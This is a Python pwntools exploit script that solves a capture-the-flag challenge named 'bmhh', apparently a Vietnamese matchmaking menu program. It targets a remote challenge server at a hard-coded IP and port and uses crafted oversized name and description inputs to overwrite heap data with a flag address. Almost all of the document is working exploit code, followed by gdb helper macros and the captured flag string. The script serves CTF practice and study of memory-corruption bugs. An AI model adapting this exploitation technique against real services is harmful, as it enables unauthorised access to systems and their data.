from pwn import *
import time
import sys

def bmhh(DEBUG):
	t = 0.3
	
	if DEBUG=="1":
		t = 0.005
		r = process("./bmhh")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '125.235.240.168'
		PORT = 17357
		r = remote(HOST,PORT)
	
	def Add(ManOrWoman, name, age, desc):
		r.sendline("1")
		r.recvuntil("> ")
		r.sendline(str(ManOrWoman))
		r.recvuntil("Name: ")
		r.sendline(name)
		r.recvuntil("Age: ")
		r.sendline(str(age))
		r.recvuntil("Description: ")
		r.sendline(desc)
		return r.recvuntil("> ")
	
	def Replace(ManOrWoman, name, age, desc, idx):
		r.sendline("1")
		r.recvuntil("> ")
		r.sendline(str(ManOrWoman))
		r.recvuntil("Name: ")
		r.sendline(name)
		r.recvuntil("Age: ")
		r.sendline(str(age))
		r.recvuntil("Description: ")
		r.sendline(desc)
		r.recvuntil("> ")
		r.sendline(str(idx))
		return r.recvuntil("> ")
	
	def View(idx):
		r.sendline("2")
		res = r.recvuntil("> ")
		r.sendline(str(idx))
		res2 = r.recvuntil("> ")
		return res+res2
	
	def Edit(idx, typeInfo, info):
		r.sendline("3")
		res = r.recvuntil("> ")
		r.sendline(str(idx))
		r.recvuntil("> ") # Chon thong tin muon sua:
		r.sendline(str(typeInfo)) # 1. Name	 | 	2. Age	 | 	3. Description
		if typeInfo==1:
			r.recvuntil("Name: ")
			r.sendline(str(info))
		elif typeInfo==2:
			r.recvuntil("Age: ")
			r.sendline(str(info))
		elif typeInfo==3:
			r.recvuntil("Description: ")
			r.sendline(str(info))
		r.recvuntil("> ")
		return res
	
	def GhepDoi():
		r.sendline("4")
		return r.recvuntil("> ")
	
	def HappyEnding(idx):
		r.sendline("5")
		r.recvuntil("> ")
		r.sendline(str(idx))
		r.recvuntil("> ")
		r.sendline("1")
		return r.recvuntil("> ")
		
	atoi_got = 0x603078
	
	FLAG = 0x603440-0x238
	r.recvuntil("> ")
	name = "A"*0x30
	age = 0x1234
	desc1 = "1"*0xfe
	Add(1, name, age, desc1) 
	
	name = "C"*0x30
	age = 0x5678
	desc = "2"*0xbe
	desc += p64(FLAG)
	desc += "4"*0x138
	Add(2, name, age, desc) 
	N = ord("C")
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	Add(2, chr(N)*0x30, age, desc)
	N+=1
	
	while 1:
		res = GhepDoi()
		if "Chuc hai ban hen ho vui ve:" in res:
			break
		time.sleep(0.01)
		
	HappyEnding(1)
	desc = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9"+p64(FLAG)+"2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9"
	Replace(2, "Z"*0x30, 0x5432, desc , 1)
	
	Replace(1, "X"*0x30, 0x4321, "4"*0xfe, 2)
	r.sendline("5")
	r.sendline("2")
	r.sendline("1")
	r.interactive()

bmhh(sys.argv[1])

"""
define ff
echo ============== LIST_PLAYER:\n
telescope 0x603460 10
echo ============== LIST_TYPE:\n
telescope 0x6034c0 10
echo ============================\n
end

define fa
telescope 0x603460 20
end
"""
# mastesctf{W3lld0ne_Expl0it_4s_e4sy_4s_pi3}